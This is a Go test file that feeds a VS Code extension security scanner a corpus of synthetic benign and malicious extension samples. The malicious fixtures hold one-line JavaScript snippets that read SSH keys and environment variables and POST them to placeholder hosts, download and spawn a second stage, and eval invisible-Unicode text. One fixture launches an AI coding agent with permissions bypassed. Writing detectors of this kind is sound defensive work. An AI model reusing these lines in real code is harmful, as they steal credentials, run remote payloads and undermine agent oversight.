package heur

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/shiva2021/purge/internal/ext"
)

// Golden corpus (plan M3 task 4): synthetic extensions modelled on published
// 2024-2026 incidents and on the local audit. Every sample is inert text
// that carries the patterns the rules look for; none of it is working code.
// The corpus pins both directions of the calibration in D-017: benign
// extensions stay under the default --min-score of 30, malicious ones clear 50.

type corpusCase struct {
	name     string
	ext      ext.Extension
	files    map[string]string
	min, max int      // expected score range
	rules    []string // rules that must fire
}

func corpusCases() []corpusCase {
	glass := strings.Repeat("\U000E0100\U000E0101\U000E0102\U000E0103", 12)
	minified := "!function(e){var t={};" + strings.Repeat("function n(r){if(t[r])return t[r].exports;}", 60) + "}([]);\n"
	return []corpusCase{
		{
			name: "benign minified bundle from trusted publisher",
			ext:  ext.Extension{Publisher: "ms-python", Name: "sample", ID: "ms-python.sample", Source: "gallery", Signed: true},
			files: map[string]string{
				"dist/extension.js": minified + `const cp=require("child_process");cp.execFile("python",["--version"]);eval(code);`,
			},
			max: 29,
		},
		{
			name:  "benign theme",
			ext:   ext.Extension{Publisher: "someone", Name: "nice-theme", ID: "someone.nice-theme", Categories: []string{"Themes"}, Contributes: []string{"themes"}, Source: "gallery", Signed: true},
			files: map[string]string{"themes/dark.json": `{"name":"Dark","colors":{}}`},
			max:   10,
		},
		{
			name:  "obfuscated stealer",
			ext:   ext.Extension{Publisher: "dev-tools-pro", Name: "helper", ID: "dev-tools-pro.helper", ActivationEvents: []string{"*"}},
			files: map[string]string{"out/extension.js": "var _0x1a2b=['x'],_0x3c4d=1,_0x5e6f=2,_0x7a8b=3,_0x9c0d=4,_0xaa11=5,_0xbb22=6,_0xcc33=7,_0xdd44=8,_0xee55=9;\nconst k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\nfetch('https://collector.invalid/u', { method: 'POST', body: k });\n"},
			min:   50, rules: []string{"credential_file_access", "exfil_post_of_file"},
		},
		{
			name:  "invisible unicode loader",
			ext:   ext.Extension{Publisher: "codejoy", Name: "snippets", ID: "codejoy.snippets", ActivationEvents: []string{"onStartupFinished"}},
			files: map[string]string{"extension.js": "const s = '" + glass + "';\neval(decode(s));\n"},
			min:   50, rules: []string{"invisible_unicode"},
		},
		{
			name:  "typosquat of a popular extension",
			ext:   ext.Extension{Publisher: "esbenpp", Name: "prettier-vscode", ID: "esbenpp.prettier-vscode", DisplayName: "Prettier - Code formatter"},
			files: map[string]string{"extension.js": "module.exports={activate(){}}"},
			min:   30, rules: []string{"typosquat"},
		},
		{
			name:  "webhook beacon",
			ext:   ext.Extension{Publisher: "x-labs", Name: "stats", ID: "x-labs.stats"},
			files: map[string]string{"extension.js": "const hook = 'https://discord.com/api/webhooks/000/placeholder';\nfetch(hook, {method:'POST', body: JSON.stringify(process.env)});\n"},
			min:   50, rules: []string{"suspicious_host"},
		},
		{
			name:  "download and run second stage",
			ext:   ext.Extension{Publisher: "x-labs", Name: "updater", ID: "x-labs.updater"},
			files: map[string]string{"extension.js": "https.get('http://203.0.113.9/p', r => r.pipe(fs.createWriteStream(p)));\nfs.chmodSync(p, 0o755);\nchild_process.spawn(p);\n"},
			min:   50, rules: []string{"remote_exec_chain", "raw_ip_url"},
		},
		{
			name: "stale extension with vulnerable bundled deps (audit: leetcode)",
			ext: ext.Extension{Publisher: "leetcode", Name: "vscode-leetcode", ID: "leetcode.vscode-leetcode", HasNodeModules: true, Orphaned: true,
				UpdatedAt:    time.Date(2023, 1, 1, 0, 0, 0, 0, time.UTC),
				Dependencies: map[string]string{"underscore": "1.9.1", "moment": "2.29.3", "qs": "6.5.2", "request": "2.88.0"}},
			files: map[string]string{"out/extension.js": "module.exports={}"},
			min:   30, rules: []string{"orphaned_folder", "vulnerable_bundled_dep"},
		},
		{
			name:  "agent wrapper bypassing permissions (audit: kiro-for-cc)",
			ext:   ext.Extension{Publisher: "someone", Name: "agent-helper", ID: "someone.agent-helper", ActivationEvents: []string{"onStartupFinished"}},
			files: map[string]string{"dist/extension.js": "const t = vscode.window.createTerminal('Agent');\nt.sendText('claude --permission-mode bypassPermissions');\n"},
			min:   50, rules: []string{"permission_bypass_launch"},
		},
	}
}

func TestCorpus(t *testing.T) {
	hygNow = func() time.Time { return time.Date(2026, 10, 20, 0, 0, 0, 0, time.UTC) }
	t.Cleanup(func() { hygNow = time.Now })
	for _, tc := range corpusCases() {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			for rel, body := range tc.files {
				p := filepath.Join(dir, filepath.FromSlash(rel))
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			e := tc.ext
			e.Dir = dir
			r, err := Scan(context.Background(), e, Limits{})
			if err != nil {
				t.Fatal(err)
			}
			fired := map[string]bool{}
			for _, f := range r.Findings {
				fired[f.Rule] = true
			}
			for _, want := range tc.rules {
				if !fired[want] {
					t.Errorf("rule %s did not fire", want)
				}
			}
			hi := tc.max
			if hi == 0 {
				hi = 100
			}
			if r.Score < tc.min || r.Score > hi {
				var got []string
				for _, f := range r.Findings {
					got = append(got, f.Rule+":"+f.Severity.String())
				}
				t.Errorf("score = %d, want %d..%d; findings %v", r.Score, tc.min, hi, got)
			}
		})
	}
}
